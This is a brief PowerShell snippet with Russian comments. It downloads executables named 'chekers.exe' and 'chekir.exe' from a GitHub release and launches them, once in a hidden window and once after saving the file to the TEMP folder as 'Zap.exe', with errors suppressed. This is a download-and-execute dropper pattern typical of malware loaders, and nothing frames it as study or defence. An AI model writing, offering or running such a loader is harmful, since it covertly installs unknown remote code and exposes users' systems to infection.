    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
    
|$p="$env:TEMP\Zap.exe"
iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
Start-Process $p

